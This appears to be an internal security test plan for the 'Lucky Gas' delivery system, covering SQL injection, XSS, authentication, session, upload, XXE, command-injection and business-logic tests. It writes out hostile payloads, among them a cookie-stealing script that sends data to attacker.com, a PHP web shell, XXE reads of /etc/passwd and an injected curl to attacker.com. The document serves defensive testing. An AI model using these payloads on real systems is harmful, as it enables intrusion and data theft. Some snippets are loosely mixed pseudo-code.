# Lucky Gas V3 Security Test Scenarios

## Overview

This document provides comprehensive security test scenarios for the Lucky Gas delivery management system. Each scenario includes test objectives, procedures, expected results, and remediation guidance.

## 🔍 SQL Injection Tests

### Test Case: SQL-001 - Basic SQL Injection in Login

**Objective**: Verify login form is protected against basic SQL injection

**Test Steps**:
```bash
# 1. Navigate to login endpoint
POST /api/v1/auth/login

# 2. Attempt basic SQL injection
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}

# 3. Try comment-based injection
{
  "username": "admin'--",
  "password": "anything"
}

# 4. Test with UNION injection
{
  "username": "admin' UNION SELECT * FROM users--",
  "password": "test"
}
```

**Expected Result**: 
- 400 Bad Request with generic error message
- No database errors exposed
- Login attempt logged as suspicious

**Validation**:
```python
# Check logs for injection attempts
grep -i "sql injection" /var/log/app/security.log
```

### Test Case: SQL-002 - Parameterized Search Injection

**Objective**: Test search endpoints for SQL injection vulnerabilities

**Test Steps**:
```bash
# 1. Customer search with injection
GET /api/v1/customers?search='; DROP TABLE customers--

# 2. Order search with UNION
GET /api/v1/orders?status=pending' UNION SELECT credit_card FROM payments--

# 3. Complex nested injection
GET /api/v1/reports?date='2024-01-01' AND (SELECT COUNT(*) FROM users) > 0--
```

**Expected Result**:
- Parameterized queries prevent injection
- Special characters properly escaped
- No data leakage

### Test Case: SQL-003 - Second-Order SQL Injection

**Objective**: Test for stored SQL injection vulnerabilities

**Test Steps**:
```python
# 1. Create customer with malicious name
POST /api/v1/customers
{
  "name": "Robert'); DROP TABLE orders--",
  "email": "test@example.com",
  "phone": "0912345678"
}

# 2. Trigger stored payload
GET /api/v1/reports/customer-summary

# 3. Check if injection executed
GET /api/v1/orders  # Should still work
```

**Expected Result**:
- Input sanitized before storage
- Stored procedures use parameters
- No execution of injected SQL

## 🌐 XSS Vulnerability Tests

### Test Case: XSS-001 - Reflected XSS

**Objective**: Test for reflected XSS vulnerabilities

**Test Steps**:
```javascript
// 1. Basic script injection in search
GET /api/v1/customers?search=<script>alert('XSS')</script>

// 2. Event handler injection
GET /api/v1/products?name=<img src=x onerror=alert('XSS')>

// 3. JavaScript protocol injection  
GET /api/v1/orders?ref=javascript:alert('XSS')

// 4. SVG injection
GET /api/v1/reports?title=<svg onload=alert('XSS')>
```

**Expected Result**:
- All output HTML-encoded
- Content-Type headers set correctly
- CSP headers prevent execution

### Test Case: XSS-002 - Stored XSS

**Objective**: Test for stored XSS in user-generated content

**Test Steps**:
```javascript
// 1. Create order with XSS payload
POST /api/v1/orders
{
  "customer_id": 1,
  "notes": "<script>fetch('/api/v1/users', {credentials: 'include'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/steal?data='+btoa(d)))</script>",
  "items": [{"product_id": 1, "quantity": 1}]
}

// 2. View order in admin panel
GET /admin/orders/123

// 3. Check if script executes
// Monitor network tab for outbound requests
```

**Expected Result**:
- Input sanitized before storage
- Output encoding on display
- No script execution

### Test Case: XSS-003 - DOM-Based XSS

**Objective**: Test client-side XSS vulnerabilities

**Test Steps**:
```javascript
// 1. Fragment identifier attack
window.location = "https://app.luckygas.com/#<img src=x onerror=alert('XSS')>"

// 2. URL parameter manipulation
window.location = "https://app.luckygas.com/?redirect=javascript:alert('XSS')"

// 3. PostMessage exploitation
window.postMessage({
  action: "updateUI",
  html: "<img src=x onerror=alert('XSS')>"
}, "*")
```

**Expected Result**:
- Client-side input validation
- Safe DOM manipulation methods
- PostMessage origin validation

## 🔑 Authentication Bypass Tests

### Test Case: AUTH-001 - JWT Manipulation

**Objective**: Test JWT token security

**Test Steps**:
```python
import jwt
import base64

# 1. Decode JWT without verification
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})

# 2. Modify claims
decoded['role'] = 'admin'
decoded['exp'] = int(time.time()) + 86400

# 3. Try algorithm confusion attack
header = base64.b64decode(token.split('.')[0])
header['alg'] = 'none'

# 4. Attempt to use modified token
headers = {'Authorization': f'Bearer {modified_token}'}
response = requests.get('https://api.luckygas.com/api/v1/admin/users', headers=headers)
```

**Expected Result**:
- Token signature validation fails
- Algorithm confusion prevented
- 401 Unauthorized response

### Test Case: AUTH-002 - Session Fixation

**Objective**: Test for session fixation vulnerabilities

**Test Steps**:
```bash
# 1. Get session before login
curl -c cookies.txt https://app.luckygas.com/
SESSION_ID=$(grep session cookies.txt | awk '{print $7}')

# 2. Login with fixed session
curl -b "session=$SESSION_ID" -X POST https://app.luckygas.com/api/v1/auth/login \
  -d '{"username":"user@example.com","password":"password"}'

# 3. Check if same session is maintained
curl -b cookies.txt https://app.luckygas.com/api/v1/profile
```

**Expected Result**:
- New session ID after login
- Old session invalidated
- Session rotation on privilege change

### Test Case: AUTH-003 - Brute Force Protection

**Objective**: Test account lockout and rate limiting

**Test Steps**:
```python
import requests
import time

# Test account lockout
for i in range(10):
    response = requests.post('https://api.luckygas.com/api/v1/auth/login', 
        json={'username': 'test@example.com', 'password': f'wrong{i}'})
    print(f"Attempt {i+1}: {response.status_code}")
    
    if response.status_code == 429:
        print(f"Rate limited after {i+1} attempts")
        break
    
    if response.status_code == 423:
        print(f"Account locked after {i+1} attempts")
        break

# Test progressive delays
start = time.time()
response = requests.post('https://api.luckygas.com/api/v1/auth/login',
    json={'username': 'test@example.com', 'password': 'wrong'})
delay = time.time() - start
print(f"Response delay: {delay}s")
```

**Expected Result**:
- Account locked after 3 attempts
- Progressive delays implemented
- IP-based rate limiting active

## 🚪 API Abuse Scenarios

### Test Case: API-001 - Rate Limit Bypass

**Objective**: Test rate limiting effectiveness

**Test Steps**:
```python
import concurrent.futures
import requests

def make_request(i):
    headers = {
        'X-Forwarded-For': f'192.168.1.{i}',  # Try to bypass with different IPs
        'X-Real-IP': f'10.0.0.{i}',
        'X-Originating-IP': f'172.16.0.{i}'
    }
    return requests.get('https://api.luckygas.com/api/v1/products', headers=headers)

# Concurrent requests from "different" IPs
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(make_request, i) for i in range(200)]
    results = [f.result() for f in futures]

# Check if rate limiting was bypassed
success_count = sum(1 for r in results if r.status_code == 200)
print(f"Successful requests: {success_count}/200")
```

**Expected Result**:
- Rate limiting not bypassed by headers
- Distributed rate limiting works
- 429 responses after limit

### Test Case: API-002 - GraphQL Introspection Attack

**Objective**: Test GraphQL security if implemented

**Test Steps**:
```graphql
# 1. Introspection query
POST /graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# 2. Deep nested query attack
{
  customers {
    orders {
      items {
        product {
          category {
            products {
              orders {
                customer {
                  # ... nested 10+ levels
                }
              }
            }
          }
        }
      }
    }
  }
}

# 3. Alias-based amplification
{
  a1: expensive_operation(id: 1)
  a2: expensive_operation(id: 2)
  # ... repeat 1000 times
}
```

**Expected Result**:
- Introspection disabled in production
- Query depth limiting active
- Query complexity analysis
- Alias limiting implemented

### Test Case: API-003 - API Key Security

**Objective**: Test API key restrictions and security

**Test Steps**:
```bash
# 1. Test key without restrictions
curl -H "X-API-Key: test_key_no_restrictions" https://api.luckygas.com/api/v1/admin/users

# 2. Test key from unauthorized domain
curl -H "X-API-Key: browser_key" -H "Origin: http://evil.com" \
  https://api.luckygas.com/api/v1/customers

# 3. Test key from unauthorized IP
curl -H "X-API-Key: server_key" -H "X-Forwarded-For: 1.2.3.4" \
  https://api.luckygas.com/api/v1/internal/metrics

# 4. Test expired key
curl -H "X-API-Key: expired_key_2023" https://api.luckygas.com/api/v1/products
```

**Expected Result**:
- Keys enforce IP/domain restrictions
- Expired keys rejected
- Usage tracked and limited
- Appropriate error messages

## 🔐 Session Management Tests

### Test Case: SESSION-001 - Session Hijacking

**Objective**: Test session security mechanisms

**Test Steps**:
```python
# 1. Login and capture session
session1 = requests.Session()
session1.post('https://api.luckygas.com/api/v1/auth/login',
    json={'username': 'user@example.com', 'password': 'password'})

# 2. Copy cookies to new session
session2 = requests.Session()
session2.cookies = session1.cookies

# 3. Change user agent
session2.headers['User-Agent'] = 'Different Browser'

# 4. Attempt to use hijacked session
response = session2.get('https://api.luckygas.com/api/v1/profile')
print(f"Hijack attempt: {response.status_code}")

# 5. Try from different IP
session2.headers['X-Forwarded-For'] = '8.8.8.8'
response = session2.get('https://api.luckygas.com/api/v1/profile')
print(f"Different IP: {response.status_code}")
```

**Expected Result**:
- Session tied to user agent
- IP validation if configured
- Suspicious activity logged
- Possible session invalidation

### Test Case: SESSION-002 - Concurrent Session Limits

**Objective**: Test concurrent session restrictions

**Test Steps**:
```python
sessions = []

# Create multiple sessions
for i in range(5):
    s = requests.Session()
    response = s.post('https://api.luckygas.com/api/v1/auth/login',
        json={'username': 'user@example.com', 'password': 'password'})
    sessions.append(s)
    print(f"Session {i+1}: {response.status_code}")

# Test if all sessions work
for i, s in enumerate(sessions):
    response = s.get('https://api.luckygas.com/api/v1/profile')
    print(f"Session {i+1} status: {response.status_code}")
```

**Expected Result**:
- Maximum 3 concurrent sessions
- Oldest session invalidated
- User notified of new login

### Test Case: SESSION-003 - Session Timeout

**Objective**: Verify session timeout implementation

**Test Steps**:
```python
import time

# 1. Login
session = requests.Session()
session.post('https://api.luckygas.com/api/v1/auth/login',
    json={'username': 'user@example.com', 'password': 'password'})

# 2. Verify session works
response = session.get('https://api.luckygas.com/api/v1/profile')
print(f"Initial request: {response.status_code}")

# 3. Wait for idle timeout (15 minutes)
print("Waiting for idle timeout...")
time.sleep(16 * 60)

# 4. Try to use session
response = session.get('https://api.luckygas.com/api/v1/profile')
print(f"After timeout: {response.status_code}")

# 5. Test absolute timeout (8 hours)
# Keep session active but wait for absolute timeout
for i in range(32):
    time.sleep(15 * 60)  # Every 15 minutes
    response = session.get('https://api.luckygas.com/api/v1/profile')
    print(f"Hour {i/4}: {response.status_code}")
```

**Expected Result**:
- Session expires after 15 min idle
- Absolute timeout at 8 hours
- 401 response after timeout
- Re-authentication required

## 🛡️ Input Validation Tests

### Test Case: INPUT-001 - File Upload Vulnerabilities

**Objective**: Test file upload security

**Test Steps**:
```python
# 1. Test file type bypass
files = {
    'file': ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}
response = requests.post('https://api.luckygas.com/api/v1/upload', files=files)

# 2. Test null byte injection
files = {
    'file': ('image.jpg\x00.php', '<?php phpinfo(); ?>', 'image/jpeg')
}
response = requests.post('https://api.luckygas.com/api/v1/upload', files=files)

# 3. Test polyglot file
with open('polyglot_jpg_js.jpg', 'rb') as f:
    files = {'file': ('test.jpg', f, 'image/jpeg')}
    response = requests.post('https://api.luckygas.com/api/v1/upload', files=files)

# 4. Test zip bomb
with open('zipbomb.zip', 'rb') as f:
    files = {'file': ('small.zip', f, 'application/zip')}
    response = requests.post('https://api.luckygas.com/api/v1/upload', files=files)
```

**Expected Result**:
- Magic number validation
- Extension whitelist enforced
- File content scanning
- Size limits enforced
- Quarantine process active

### Test Case: INPUT-002 - XXE Injection

**Objective**: Test XML External Entity injection

**Test Steps**:
```xml
# 1. Basic XXE to read files
POST /api/v1/import/xml
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<customers>
  <customer>
    <name>&xxe;</name>
  </customer>
</customers>

# 2. Blind XXE with external DTD
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>

# 3. Billion laughs attack
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!-- ... continue pattern ... -->
]>
<lolz>&lol9;</lolz>
```

**Expected Result**:
- External entities disabled
- DTD processing disabled
- Entity expansion limits
- No file disclosure

### Test Case: INPUT-003 - Command Injection

**Objective**: Test for command injection vulnerabilities

**Test Steps**:
```bash
# 1. Test in export filename
POST /api/v1/reports/export
{
  "format": "pdf",
  "filename": "report_$(whoami).pdf"
}

# 2. Test in image processing
POST /api/v1/images/resize
{
  "url": "https://example.com/image.jpg; cat /etc/passwd",
  "width": 100,
  "height": 100
}

# 3. Test in backup operations
POST /api/v1/admin/backup
{
  "destination": "/backup/$(date +%Y%m%d).tar.gz; curl http://attacker.com/notify"
}

# 4. Test in log viewing
GET /api/v1/admin/logs?file=app.log;id
```

**Expected Result**:
- Input sanitization active
- Command execution prevented
- Whitelist validation
- Safe alternatives used

## 🔒 Cryptographic Tests

### Test Case: CRYPTO-001 - Weak Encryption

**Objective**: Test encryption strength and implementation

**Test Steps**:
```python
# 1. Check TLS configuration
import ssl
import socket

context = ssl.create_default_context()
with socket.create_connection(('api.luckygas.com', 443)) as sock:
    with context.wrap_socket(sock, server_hostname='api.luckygas.com') as ssock:
        print(f"TLS Version: {ssock.version()}")
        print(f"Cipher: {ssock.cipher()}")

# 2. Test for encryption downgrade
curl --tlsv1.0 https://api.luckygas.com/api/v1/health
curl --sslv3 https://api.luckygas.com/api/v1/health

# 3. Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 api.luckygas.com

# 4. Test password reset token randomness
tokens = []
for i in range(100):
    response = requests.post('https://api.luckygas.com/api/v1/auth/forgot-password',
        json={'email': f'test{i}@example.com'})
    # Extract token from response or email
    tokens.append(extract_token(response))

# Analyze token entropy
from collections import Counter
print(f"Unique tokens: {len(set(tokens))}")
```

**Expected Result**:
- TLS 1.2+ only
- Strong ciphers only
- No downgrade possible
- High entropy tokens

### Test Case: CRYPTO-002 - Password Storage

**Objective**: Verify secure password storage

**Test Steps**:
```sql
-- If database access available (should not be in production)
-- 1. Check password hash format
SELECT username, password FROM users LIMIT 5;
-- Should see bcrypt hashes like: $2b$12$...

-- 2. Check for plaintext passwords
SELECT * FROM users WHERE password NOT LIKE '$2b$%';

-- 3. Check for weak hashing
SELECT * FROM users WHERE LENGTH(password) < 60;
```

**Expected Result**:
- Bcrypt hashes only
- Minimum 12 rounds
- No plaintext/weak hashes
- Salts are unique

## 🎯 Business Logic Tests

### Test Case: LOGIC-001 - Price Manipulation

**Objective**: Test for business logic flaws in pricing

**Test Steps**:
```python
# 1. Negative quantity test
POST /api/v1/orders
{
  "customer_id": 1,
  "items": [
    {"product_id": 1, "quantity": -10, "price": 1000}
  ]
}

# 2. Price override attempt
POST /api/v1/orders
{
  "customer_id": 1,
  "items": [
    {"product_id": 1, "quantity": 1, "price": 0.01}
  ]
}

# 3. Integer overflow
POST /api/v1/orders
{
  "customer_id": 1,
  "items": [
    {"product_id": 1, "quantity": 2147483647, "price": 2}
  ]
}

# 4. Race condition in inventory
import threading

def place_order():
    requests.post('https://api.luckygas.com/api/v1/orders',
        json={'customer_id': 1, 'items': [{'product_id': 1, 'quantity': 100}]})

# Try to order more than available inventory
threads = [threading.Thread(target=place_order) for _ in range(10)]
for t in threads:
    t.start()
```

**Expected Result**:
- Negative quantities rejected
- Prices validated server-side
- Integer overflow handled
- Race conditions prevented

### Test Case: LOGIC-002 - Authorization Bypass

**Objective**: Test for authorization flaws

**Test Steps**:
```python
# 1. IDOR - Access other user's data
# Login as user1
session1 = login_as_user('user1@example.com')

# Try to access user2's orders
response = session1.get('https://api.luckygas.com/api/v1/orders/9999')

# 2. Privilege escalation via parameter
POST /api/v1/users/profile
{
  "name": "Test User",
  "email": "test@example.com",
  "role": "admin"  # Try to escalate
}

# 3. Function level bypass
# As regular user, try admin endpoints
response = session1.get('https://api.luckygas.com/api/v1/admin/users')
response = session1.post('https://api.luckygas.com/api/v1/admin/settings',
    json={'maintenance_mode': True})
```

**Expected Result**:
- IDOR prevented
- Role changes ignored
- Admin endpoints return 403
- Proper authorization checks

### Test Case: LOGIC-003 - Workflow Bypass

**Objective**: Test for workflow security

**Test Steps**:
```python
# 1. Skip payment step
# Create order
order_response = requests.post('https://api.luckygas.com/api/v1/orders', 
    json={'customer_id': 1, 'items': [{'product_id': 1, 'quantity': 1}]})
order_id = order_response.json()['id']

# Try to mark as delivered without payment
requests.post(f'https://api.luckygas.com/api/v1/orders/{order_id}/deliver')

# 2. Status manipulation
# Try invalid status transitions
requests.patch(f'https://api.luckygas.com/api/v1/orders/{order_id}',
    json={'status': 'delivered'})  # From 'pending' to 'delivered'

# 3. Bypass credit limit
# Order beyond credit limit
requests.post('https://api.luckygas.com/api/v1/orders',
    json={'customer_id': 1, 'items': [{'product_id': 1, 'quantity': 99999}]})
```

**Expected Result**:
- Workflow enforced
- Invalid transitions rejected
- Business rules validated
- Credit limits enforced

## 📝 Test Execution Guide

### Environment Setup
```bash
# Install required tools
pip install requests pytest sqlmap paramiko
npm install -g zap-cli

# Set up test environment variables
export API_URL="https://api.luckygas.com"
export TEST_USER="security@test.com"
export TEST_PASS="SecureTest123!"
```

### Automated Security Testing
```python
# run_security_tests.py
import pytest
import sys

def run_security_suite():
    """Run comprehensive security test suite"""
    
    test_categories = [
        'test_sql_injection.py',
        'test_xss_vulnerabilities.py', 
        'test_authentication.py',
        'test_api_security.py',
        'test_session_management.py',
        'test_input_validation.py',
        'test_cryptography.py',
        'test_business_logic.py'
    ]
    
    results = {}
    
    for category in test_categories:
        print(f"\n{'='*50}")
        print(f"Running {category}")
        print('='*50)
        
        result = pytest.main([
            '-v',
            f'security_tests/{category}',
            '--junit-xml=reports/{category}.xml'
        ])
        
        results[category] = 'PASSED' if result == 0 else 'FAILED'
    
    # Generate summary report
    generate_security_report(results)
    
    return all(r == 'PASSED' for r in results.values())

if __name__ == '__main__':
    success = run_security_suite()
    sys.exit(0 if success else 1)
```

### Manual Testing Checklist

1. **Pre-test Setup**
   - [ ] Test environment isolated
   - [ ] Monitoring enabled
   - [ ] Backup created
   - [ ] Team notified

2. **During Testing**
   - [ ] Document all findings
   - [ ] Capture evidence (screenshots, logs)
   - [ ] Note false positives
   - [ ] Track test coverage

3. **Post-test Actions**
   - [ ] Clean test data
   - [ ] Reset rate limits
   - [ ] Review logs
   - [ ] Report generation

### Security Test Metrics

Track these metrics for each test run:

```python
metrics = {
    'total_tests': 150,
    'passed': 142,
    'failed': 8,
    'critical_findings': 2,
    'high_findings': 3,
    'medium_findings': 3,
    'low_findings': 15,
    'false_positives': 5,
    'test_coverage': 95.5,
    'execution_time': '4h 23m'
}
```

---

**Document Version**: 1.0  
**Last Updated**: 2024-01-30  
**Next Review**: 2024-02-15  
**Owner**: Security Team  
**Classification**: Confidential